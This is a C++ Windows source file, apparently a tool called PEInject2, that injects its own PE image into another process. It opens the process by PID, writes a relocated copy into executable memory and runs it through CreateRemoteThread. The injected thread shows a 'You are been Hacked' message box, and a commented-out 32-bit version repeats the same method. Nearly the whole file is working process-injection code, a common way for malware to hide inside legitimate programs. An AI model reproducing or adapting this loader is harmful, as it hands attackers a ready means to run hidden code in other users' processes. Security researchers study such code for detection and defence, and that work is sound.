	//#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>
#include <cmath>
#include <iostream>
#include <TlHelp32.h>
#include <comdef.h>
DWORD WINAPI ThreadInject(PVOID64);

int main(int argc ,char ** argv)
{
	if (argc<2)
	{
		printf("\nUsage: PEInject2 [PID]\n");
		return -1;
	}
		
		
	HANDLE hProcess = NULL;
	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, strtoul(argv[1], NULL, 0));
	if (!hProcess) {
		printf("[*] Cannot open target process. Error num: %d\r\n",GetLastError());
		return 0;
	}

	PVOID64 imageBase = GetModuleHandle(NULL);
	if (!imageBase) {
		printf("[*] Cannot get image base of current process. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}

	PIMAGE_DOS_HEADER dosHeader = NULL;
	dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	if (!dosHeader) {
		printf("[*] Cannot get image dos header of current process. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}

	PIMAGE_NT_HEADERS ntHeader = NULL;
	ntHeader = (PIMAGE_NT_HEADERS)((PUCHAR)imageBase + dosHeader->e_lfanew);
	if (!ntHeader) {
		printf("[*] Cannot get image nt headers of current process. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}

	PVOID64 allocatedMem = NULL;
	allocatedMem = VirtualAllocEx(hProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!allocatedMem) {
		printf("[*] Cannot allocate target process memory. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}

	PVOID64 Buffer = NULL;
	Buffer = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!Buffer) {
		printf("[*] Cannot allocate current process memory. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}

	memcpy(Buffer, imageBase, ntHeader->OptionalHeader.SizeOfImage);

	PIMAGE_BASE_RELOCATION baseRelocation = NULL;
	baseRelocation = (PIMAGE_BASE_RELOCATION)((PUCHAR)Buffer + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	if (!baseRelocation) {
		printf("[*] Cannot get image base relocation. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}

	ULONG64 Delta, OldDelta = NULL;
	Delta = (ULONG64)allocatedMem - (ULONG64)imageBase;
	
	if (!Delta) {
		printf("[*] Cannot calculate allocated image size. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}
	
	ULONG64 Count = 0, i = 0, *p = NULL;
	PUSHORT Offset;
	while (baseRelocation->VirtualAddress)
	{
		if (baseRelocation->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
		{
			Count = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/ sizeof(USHORT);
			Offset = (PUSHORT)(baseRelocation + 1);
			for (i = 0; i < Count; i++)
			{
				if (Offset[i]) {
					p = (PULONG64)((PUCHAR)Buffer + baseRelocation->VirtualAddress + (Offset[i] & 0x0FFF));
					*p += Delta;
				}
			}
		}
		baseRelocation = (PIMAGE_BASE_RELOCATION)((PUCHAR)baseRelocation + baseRelocation->SizeOfBlock);
	}

	BOOL bWrite = FALSE;
	bWrite = WriteProcessMemory(hProcess, allocatedMem, Buffer, ntHeader->OptionalHeader.SizeOfImage, NULL);
	if (!bWrite) {
		printf("[*] Cannot write target memory. Error num: %d\r\n", GetLastError());
		VirtualFreeEx(hProcess, allocatedMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		getchar();
		return 0;
	}

	VirtualFree(Buffer, 0, MEM_RELEASE);

	HANDLE hThread = NULL;
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((PUCHAR)ThreadInject + Delta), NULL, 0, NULL);
	if (!hThread) {
		printf("[*] Cannot create remote thread : %d\r\n", GetLastError());
		VirtualFreeEx(hProcess, allocatedMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		getchar();
		return 0;
	}

	printf("Waiting for the thread to terminate.\r\n");
	WaitForSingleObject(hThread, INFINITE);

	printf("Thread terminated\r\n");
	VirtualFreeEx(hProcess, allocatedMem, 0, MEM_RELEASE);

	printf("Free aloocated memory\r\n");
	CloseHandle(hProcess);
	getchar();
	return 0;
}


DWORD WINAPI ThreadInject(PVOID64 Param)
{
	MessageBox(NULL, L"You are been Hacked by Hackers Gruop!", L"Alert!!", MB_ICONINFORMATION);
	return 0;
}

DWORD GetProcID(std::string ProcName)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);
	do {
		//translate wchar to char
		_bstr_t b(pe32.szExeFile);
		char * processName = b;
		if (strcmp(processName, ProcName.c_str()) == 0)
		{
			DWORD ProcId = pe32.th32ProcessID;
			CloseHandle(hProcessSnap);
			return ProcId;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return 0;
}

BOOL ProcessExists(std::string process)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);
	do {
		//translate wchar to char
		_bstr_t b(pe32.szExeFile);
		char * processName = b;
		if (strcmp(processName, process.c_str()) == 0)
		{
			CloseHandle(hProcessSnap);
			return true;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return false;
}

//for 32 bit
//#include <stdio.h>
//#include <Windows.h>
//
//DWORD WINAPI ThreadProc(PVOID p)
//{
//	MessageBox(NULL, L"Message from injected code!", L"Message", MB_ICONINFORMATION);
//	return 0;
//}

//int main(int argc, char* argv[])
//{
//	PIMAGE_DOS_HEADER pIDH;
//	PIMAGE_NT_HEADERS pINH;
//	PIMAGE_BASE_RELOCATION pIBR;
//
//	HANDLE hProcess, hThread;
//	PUSHORT TypeOffset;
//
//	PVOID ImageBase, Buffer, mem;
//	ULONG i, Count, Delta, *p;
//
//	if (argc<2)
//	{
//		printf("\nUsage: PEInject2 [PID]\n");
//		return -1;
//	}
//
//	printf("\nOpening target process\n");
//
//	hProcess = OpenProcess(
//		PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
//		FALSE,
//		strtoul(argv[1], NULL, 0));
//
//	if (!hProcess)
//	{
//		printf("\nError: Unable to open target process (%u)\n", GetLastError());
//		return -1;
//	}
//
//	ImageBase = GetModuleHandle(NULL);
//	printf("\nImage base in current process: %#x\n", ImageBase);
//
//	pIDH = (PIMAGE_DOS_HEADER)ImageBase;
//	pINH = (PIMAGE_NT_HEADERS)((PUCHAR)ImageBase + pIDH->e_lfanew);
//
//	printf("\nAllocating memory in target process\n");
//	mem = VirtualAllocEx(hProcess, NULL, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//
//	if (!mem)
//	{
//		printf("\nError: Unable to allocate memory in target process (%u)\n", GetLastError());
//
//		CloseHandle(hProcess);
//		return 0;
//	}
//
//	printf("\nMemory allocated at %#x\n", mem);
//
//	Buffer = VirtualAlloc(NULL, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//	memcpy(Buffer, ImageBase, pINH->OptionalHeader.SizeOfImage);
//
//	printf("\nRelocating image\n");
//
//	pIBR = (PIMAGE_BASE_RELOCATION)((PUCHAR)Buffer + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
//	Delta = (ULONG)mem - (ULONG)ImageBase;
//
//	printf("\nDelta: %#x\n", Delta);
//
//	while (pIBR->VirtualAddress)
//	{
//		if (pIBR->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
//		{
//			Count = (pIBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
//			TypeOffset = (PUSHORT)(pIBR + 1);
//
//			for (i = 0; i<Count; i++)
//			{
//				if (TypeOffset[i])
//				{
//					p = (PULONG)((PUCHAR)Buffer + pIBR->VirtualAddress + (TypeOffset[i] & 0xFFF));
//					*p += Delta;
//				}
//			}
//		}
//
//		pIBR = (PIMAGE_BASE_RELOCATION)((PUCHAR)pIBR + pIBR->SizeOfBlock);
//	}
//
//	printf("\nWriting relocated image into target process\n");
//
//	if (!WriteProcessMemory(hProcess, mem, Buffer, pINH->OptionalHeader.SizeOfImage, NULL))
//	{
//		printf("\nError: Unable to write process memory (%u)\n", GetLastError());
//
//		VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
//		CloseHandle(hProcess);
//
//		return -1;
//	}
//
//	VirtualFree(Buffer, 0, MEM_RELEASE);
//
//	printf("\nCreating thread in target process\n");
//	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((PUCHAR)ThreadProc + Delta), NULL, 0, NULL);
//
//	if (!hThread)
//	{
//		printf("\nError: Unable to create thread in target process (%u)\n", GetLastError());
//
//		VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
//		CloseHandle(hProcess);
//
//		return -1;
//	}
//
//	printf("\nWaiting for the thread to terminate\n");
//	WaitForSingleObject(hThread, INFINITE);
//
//	printf("\nThread terminated\n\nFreeing allocated memory\n");
//
//	VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
//	CloseHandle(hProcess);
//
//	return 0;
//}